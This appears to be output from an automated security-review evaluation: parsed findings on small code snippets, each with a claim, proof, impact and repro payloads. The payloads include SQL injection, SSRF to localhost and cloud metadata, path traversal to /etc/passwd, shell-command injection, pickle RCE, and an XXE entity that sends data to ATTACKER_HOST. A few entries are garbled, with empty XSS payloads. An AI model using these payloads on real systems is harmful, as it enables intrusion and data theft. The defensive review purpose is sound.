parsed_findings.chain_steps: Inject via `dir` or any insufficiently validated `sort` value, then use injected SQL to read sensitive fields or modify queries.
parsed_findings.impact: Allows arbitrary SQL execution in the context of the app DB account, potentially leading to data exfiltration or tampering.
parsed_findings.proof: `q = f'SELECT id,email FROM users ORDER BY {sort} {direction}'` inserts attacker-controlled strings into SQL without parameterization or strict validation of `direction`.
parsed_findings.repro_steps: Call `list_users` with `?sort=name&dir=asc;SELECT+pg_sleep(5)--` (or DB-specific payload) and observe delayed/altered results.
parsed_findings.vuln_claim: User-controlled `sort`/`dir` are interpolated into the SQL `ORDER BY` clause, enabling SQL injection despite a partial allowlist.

parsed_findings.chain_steps: Use SSRF to reach internal admin endpoints, then leverage any exposed functionality to escalate impact.
parsed_findings.impact: Attackers can access internal services, metadata endpoints, or pivot to further attacks via internal network reachability.
parsed_findings.proof: Request `/fetch?url=http://127.0.0.1:8080/` to force the server to fetch internal content.
parsed_findings.repro_steps: Send an HTTP GET to `/fetch?url=http://127.0.0.1:8080/` and observe the server returning the internal response body.
parsed_findings.vuln_claim: User-controlled `req.query.url` is passed to `axios.get` with only a broken/ineffective target check, enabling SSRF.

parsed_findings.chain_steps: 1) Submit script in `note` 2) invoice view renders `note` 3) browser executes payload.
parsed_findings.impact: Stored script execution in victims' browsers, leading to session theft/CSRF actions.
parsed_findings.proof: `inv.note` is set directly from `request.json.get('note', inv.note)` without sanitization/encoding.
parsed_findings.repro_steps: PATCH `/api/invoices/<inv_id>` with JSON `{"note":"<script>alert(1)</script>"}` and then load the invoice page that displays `note`.
parsed_findings.vuln_claim: Unvalidated `note` from `request.json` is persisted, enabling stored XSS if `inv.note` is later rendered unsafely.

results.raw_output: {"skill_anchor":{"phase":"web","first_file":"01-prerequisites-and-environment.md"},"findings":[{"cwe":"CWE-79","file":"invoices.py","line_start":6,"line_end":6,"vuln_claim":"Unvalidated `note` from `request.json` is persisted, enabling stored XSS if `inv.note` is later rendered unsafely.","proof":"`inv.note` is set directly from `request.json.get('note', inv.note)` without sanitization/encoding.","repro_steps":"PATCH `/api/invoices/<inv_id>` with JSON `{\"note\":\"<script>alert(1)</script>\"}` and then load the invoice page that displays `note`.","impact":"Stored script execution in victims' browsers, leading to session theft/CSRF actions.","confidence":0.45,"chain_steps":"1) Submit script in `note` 2) invoice view renders `note` 3) browser executes payload."}]}

parsed_findings.impact: Attacker can exfiltrate sensitive server files readable by the Node process.
parsed_findings.proof: `req.query.file` is sanitized with only a single `replace('../','')`, then `path.join('/srv/data', f)` can still resolve outside the intended directory.
parsed_findings.repro_steps: Request `/download?file=..%2f..%2fetc%2fpasswd` (or `file=../../etc/passwd`) and observe the file contents returned with HTTP 200.
parsed_findings.vuln_claim: Unvalidated user-controlled path allows directory traversal to read arbitrary files via the `/download?file=` parameter.

results.raw_output: {"skill_anchor":{"phase":"web","first_file":"01-prerequisites-and-environment.md"},"findings":[{"cwe":"CWE-22","file":"files.js","line_start":2,"line_end":4,"vuln_claim":"Unvalidated user-controlled path allows directory traversal to read arbitrary files via the `/download?file=` parameter.","proof":"`req.query.file` is sanitized with only a single `replace('../','')`, then `path.join('/srv/data', f)` can still resolve outside the intended directory.","repro_steps":"Request `/download?file=..%2f..%2fetc%2fpasswd` (or `file=../../etc/passwd`) and observe the file contents returned with HTTP 200.","impact":"Attacker can exfiltrate sensitive server files readable by the Node process.","confidence":0.9,"chain_steps":""}]}

parsed_findings.chain_steps: Cookie `state` controls `raw` -> base64 decode -> `pickle.loads` triggers gadget chain -> RCE in app context.
parsed_findings.impact: Unauthenticated attackers can get arbitrary code execution in the web process.
parsed_findings.proof: Craft a base64-encoded pickle payload that executes code on unpickling, then set it as the `state` cookie and call `/resume`.
parsed_findings.repro_steps: Set cookie `state` to base64(pickle(RCE_object)); request `GET /resume`; observe server-side command execution or a side effect.
parsed_findings.vuln_claim: Insecure deserialization via `pickle.loads(base64.b64decode(raw))` on attacker-controlled cookie `state` enables remote code execution.

results.raw_output: {"skill_anchor":{"phase":"pwn","first_file":"01-environment-baseline.md"},"findings":[{"cwe":"CWE-502","file":"session.py","line_start":6,"line_end":6,"vuln_claim":"Insecure deserialization via `pickle.loads(base64.b64decode(raw))` on attacker-controlled cookie `state` enables remote code execution.","proof":"Craft a base64-encoded pickle payload that executes code on unpickling, then set it as the `state` cookie and call `/resume`.","repro_steps":"Set cookie `state` to base64(pickle(RCE_object)); request `GET /resume`; observe server-side command execution or a side effect.","impact":"Unauthenticated attackers can get arbitrary code execution in the web process.","confidence":0.95,"chain_steps":"Cookie `state` controls `raw` -> base64 decode -> `pickle.loads` triggers gadget chain -> RCE in app context."}]}

parsed_findings.chain_steps: If access is granted, use mass-assignment at line 6 to modify sensitive fields, then persist via `db.users.save` (line 7).
parsed_findings.impact: Unauthorized modification of user records can lead to data integrity loss and account takeover paths.
parsed_findings.proof: The guard is malformed at `if (req.user.id req.user.isSupport)` (line 2), so the intended ownership/support check cannot reliably enforce access.
parsed_findings.repro_steps: Send `PATCH /api/users/<victimId>` with any JSON body; if the guard condition evaluates unexpectedly, observe `200 {ok:true}` (line 8).
parsed_findings.vuln_claim: Broken/incorrect authorization logic at line 2 may allow an attacker to patch arbitrary users, bypassing the 403 guard.

parsed_findings.chain_steps: Combine with authorization weakness at line 2 to target other users, then overwrite privileges at line 6 before saving (lines 6-7).
parsed_findings.impact: Privilege escalation and persistent account state changes if protected fields exist on the user model.
parsed_findings.proof: Line 6 directly merges `req.body` into `user` without field allowlisting or sanitization, and line 7 persists with `db.users.save`.
parsed_findings.repro_steps: PATCH `/api/users/<id>` with body containing sensitive/protected properties (e.g., `isSupport`, role, privilege fields) and verify they persist after `save` (lines 6-7).
parsed_findings.vuln_claim: Mass assignment via `Object.assign(user, req.body)` enables overwriting protected fields on the target user document.

parsed_findings.chain_steps: Exploit injection to execute arbitrary commands, then pivot to persistence/exfiltration as allowed by runtime permissions.
parsed_findings.impact: RCE as the service account, full data compromise, and host takeover depending on privileges.
parsed_findings.proof: Send `name=foo;id>/tmp/pwned;#` so the resulting `tar` command runs `id` on the host.
parsed_findings.repro_steps: POST /backup with JSON `{"name":"foo;id>/tmp/pwned;#","src":"/var/data/app"}` then check `/tmp/pwned`.
parsed_findings.vuln_claim: User-controlled `name` is interpolated into a shell command executed via `os.system`, enabling OS command injection.

parsed_findings.chain_steps: Bypass into command execution, then access secrets from the filesystem or reach internal services via spawned commands.
parsed_findings.impact: RCE and sensitive file disclosure via arbitrary command execution under the API process permissions.
parsed_findings.proof: Use `src="/var/data/app;cat /etc/passwd>/tmp/leak;#"` because the command string concatenates raw `src` into the shell.
parsed_findings.repro_steps: POST /backup with JSON `{"name":"daily","src":"/var/data/app;cat /etc/passwd>/tmp/leak;#"}` and then read `/tmp/leak`.
parsed_findings.vuln_claim: User-controlled `src` is inserted into `tar` without quoting/escaping, so crafted values can break out of arguments and inject commands despite the prefix check.

parsed_findings.chain_steps: Stored XSS -> victim browser JS execution -> session/data compromise or CSRF actions.
parsed_findings.impact: Attackers can execute arbitrary JS in other users’ browsers, stealing sessions or performing actions as the victim.
parsed_findings.proof: Send `body` like `` so `rendered` contains attacker script.
parsed_findings.repro_steps: POST `/comments` with JSON `{body:""}` then GET `/comments` and load the returned comment HTML.
parsed_findings.vuln_claim: Untrusted `body` is rendered from Markdown to HTML and stored/returned without sanitization, enabling stored XSS via injected HTML/JS.

parsed_findings.chain_steps: Missing authorization -> data leakage -> potential privacy/targeting harm.
parsed_findings.impact: Confidential comment content may be disclosed to unauthorized users.
parsed_findings.proof: If `db.all_comments()` includes other users’ comments, any caller can read them.
parsed_findings.repro_steps: GET `/comments` as an unauthenticated or low-privileged user and observe comments not belonging to them.
parsed_findings.vuln_claim: `/comments` listing appears to return all comments without any access control check, risking unauthorized data exposure.

parsed_findings.chain_steps: Forged JWT -> verification throw -> production fallback decode -> application trusts returned claims -> access as victim/admin.
parsed_findings.impact: Attackers can bypass auth/impersonate users by supplying a token that fails verification but still yields usable decoded claims.
parsed_findings.proof: `jwt.decode` does not verify the token signature, but its output is returned from `verifyToken` in production, so untrusted data can be treated as authenticated claims.
parsed_findings.repro_steps: Send a request with `Authorization: Bearer <forged/invalid JWT>` and ensure verification throws; observe `verifyToken` returns decoded claims in production.
parsed_findings.vuln_claim: On JWT verification failure in production, the code falls back to `jwt.decode(t)` without signature or claim validation, enabling authentication bypass with an arbitrary token payload.

parsed_findings.chain_steps: Exploit timing to recover a valid HMAC, then replay the forged request body to control the downstream event processing.
parsed_findings.impact: An attacker may forge webhook requests and trigger `process_event` without knowing `SECRET`.
parsed_findings.proof: An attacker can measure response times across many requests to infer partial correctness of the signature before full match.
parsed_findings.repro_steps: Send many POSTs to `/hook` with attacker-controlled `body` and varying `X-Sig` prefixes; keep everything else fixed and statistically correlate latency to prefix length.
parsed_findings.vuln_claim: Uses non-constant-time equality (`got == want`) for an HMAC signature, enabling a timing side-channel to guess valid signatures.

parsed_findings.chain_steps: Use the redirect to send a victim to an attacker page, then phish or exploit client-side trust.
parsed_findings.impact: Attacker can redirect users to phishing/malware pages from a trusted site.
parsed_findings.proof: Request `GET /go?next=//attacker.com/%2f` and observe the Location redirects to the provided value.
parsed_findings.repro_steps: 1) Send `GET /go?next=//attacker.com/` 2) Verify the 302/Location header points to the attacker-controlled host/path.
parsed_findings.vuln_claim: Potential open redirect via unsafely trusted `next` path after only checking it starts with `/`.

parsed_findings.chain_steps: Untrusted XML -> XXE enabled by `resolve_entities=True` -> entity expansion -> attacker-controlled content in `doc.findtext('title')`.
parsed_findings.impact: Attackers can exfiltrate server-side files and other sensitive data via expanded entities, potentially escalating to further compromise.
parsed_findings.proof: `etree.XMLParser(resolve_entities=True, ...)` combined with `etree.fromstring(request.data, parser=parser)` allows external entity expansion.
parsed_findings.repro_steps: POST `/xml/import` with an XML body containing a `<!DOCTYPE ... [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` and use `&xxe;` in `<title>`, then read the reflected/returned `<title>` content.
parsed_findings.vuln_claim: The endpoint enables XML External Entity resolution and parses untrusted `request.data`, enabling XXE to read local/secret files or access attacker-controlled external entities.

parsed_findings.chain_steps: Untrusted XML -> external SYSTEM identifiers fetched due to `no_network=False` -> outbound connection to attacker/internal host -> side-channel or data exfiltration.
parsed_findings.impact: The server can be forced to make outbound network requests, leaking environment data and interacting with internal services.
parsed_findings.proof: `etree.XMLParser(..., no_network=False)` permits network retrieval for external entity SYSTEM identifiers.
parsed_findings.repro_steps: POST `/xml/import` with an XML `SYSTEM "http://ATTACKER_HOST/xxe?c={file or token}"` entity referenced in `<title>`, then check `ATTACKER_HOST` logs for inbound requests.
parsed_findings.vuln_claim: External entity resolution is allowed with network access permitted (`no_network=False`), enabling SSRF-style outbound requests via XXE.

parsed_findings.chain_steps: If the guarded code issues sessions/tokens, this directly enables unauthorized session establishment.
parsed_findings.impact: Attackers can log in without valid credentials, leading to account takeover or unauthorized access.
parsed_findings.proof: In `login.js`, line 4 contains `if ( true });`, making the guarded logic execute unconditionally.
parsed_findings.repro_steps: Send a POST to `/login` with any `email` and `password` values and verify you are treated as authenticated due to the unconditional branch.
parsed_findings.vuln_claim: The login authentication check is effectively bypassed because the condition is hardcoded to `true`.

parsed_findings.chain_steps: Use SSRF to query internal admin endpoints or metadata, then infer secrets via content-size/timing or follow-on requests using discovered URLs.
parsed_findings.impact: Attackers can reach internal services (including cloud instance metadata) and potentially exfiltrate information via response differences.
parsed_findings.proof: `fetch_avatar()` reads `request.json['url']` and directly calls `requests.get(url, timeout=2)` returning the fetched content size.
parsed_findings.repro_steps: Send POST `/avatar/fetch` with JSON `{"url":"http://169.254.169.254/latest/meta-data/"}` and observe nonzero `size` or timing differences.
parsed_findings.vuln_claim: User-controlled `url` is fetched server-side with only a weak `http` prefix check, enabling SSRF to internal or metadata endpoints.

parsed_findings.chain_steps: Overflow `buf` to overwrite saved frame/return address, then redirect execution to attacker-controlled bytes or a ROP chain.
parsed_findings.impact: Potential remote code execution or denial of service via overwritten return address/stack variables.
parsed_findings.proof: `gets(buf)` performs no bounds checking, so any input longer than 63 bytes plus terminator will overflow `buf`.
parsed_findings.repro_steps: Run the program and paste a string longer than 80 bytes (e.g., 200 'A's) to trigger a crash or hijack.
parsed_findings.vuln_claim: Use of `gets(buf)` allows attacker-controlled input to overflow the 64-byte stack buffer and corrupt control data.

parsed_findings.chain_steps: Use the stolen access_token against the auth backend to access protected endpoints.
parsed_findings.impact: Attackers can steal session tokens and impersonate the user until token expiry/rotation.
parsed_findings.proof: The code uses ctx.getSharedPreferences(...).edit().putString("access_token", token).apply() without encryption or secure storage.
parsed_findings.repro_steps: Run the app, obtain the stored SharedPreferences file under the app’s data directory, and read access_token directly.
parsed_findings.vuln_claim: access_token is stored unencrypted in SharedPreferences, making it susceptible to extraction on rooted devices or via app-data leakage.

parsed_findings.chain_steps: If attacker gets the source (or key via leak), they can decrypt all encrypted blobs; no per-message key derivation exists.
parsed_findings.impact: Compromises confidentiality: all past and future encrypted data can be decrypted once the key is obtained.
parsed_findings.proof: KEY is a constant byte string at line 2, so every encryption uses the same secret.
parsed_findings.repro_steps: Read KEY at line 2, then decrypt any captured `iv+ciphertext` with the same AES-CBC key.
parsed_findings.vuln_claim: Hardcoded static AES key enables key recovery/credential reuse across all deployments and ciphertexts.

parsed_findings.chain_steps: Because there is no authentication tag, modified ciphertext will decrypt but application cannot distinguish it from genuine data.
parsed_findings.impact: Enables integrity attacks: attacker can tamper plaintext or trigger application-level logic errors without detection.
parsed_findings.proof: Ciphertext is returned as `iv + cipher.encrypt(...)` with no MAC/AEAD, enabling bit-flipping changes that alter decrypted blocks.
parsed_findings.repro_steps: Modify bytes in block N-1 (IV or previous ciphertext) to flip chosen bits in plaintext block N, then observe no integrity check failure.
parsed_findings.vuln_claim: AES-CBC encryption is not authenticated, allowing ciphertext malleability and undetected tampering of plaintext after decryption.

parsed_findings.chain_steps: This can be triggered by attacker-controlled parameters in native callers.
parsed_findings.impact: Process crash (DoS) and potential undefined behavior.
parsed_findings.proof: Passing `out=NULL` and `out_sz>0` makes the guard `if (out || out_sz == 0) return -1;` skip the return, then `memcpy(out,...)` and `out[n]='\0'` dereference NULL.
parsed_findings.repro_steps: Call `copy_name("A", NULL, 2)`; it reaches `memcpy(out, ...)` and crashes when writing `out[n]='\0'`.
parsed_findings.vuln_claim: Incorrect null check allows `out` to be NULL, causing a null-pointer dereference at `out[n]='\0'` (and `memcpy` writes via `out`).

results.raw_output: {"skill_anchor":{"phase":"pwn","first_file":"01-environment-baseline.md"},"findings":[{"cwe":"CWE-476","file":"safe_copy.c","line_start":3,"line_end":6,"vuln_claim":"Incorrect null check allows `out` to be NULL, causing a null-pointer dereference at `out[n]='\\0'` (and `memcpy` writes via `out`).","proof":"Passing `out=NULL` and `out_sz>0` makes the guard `if (out || out_sz == 0) return -1;` skip the return, then `memcpy(out,...)` and `out[n]='\\0'` dereference NULL.","repro_steps":"Call `copy_name(\"A\", NULL, 2)`; it reaches `memcpy(out, ...)` and crashes when writing `out[n]='\\0'`.","impact":"Process crash (DoS) and potential undefined behavior.","confidence":0.85,"chain_steps":"This can be triggered by attacker-controlled parameters in native callers."}]}
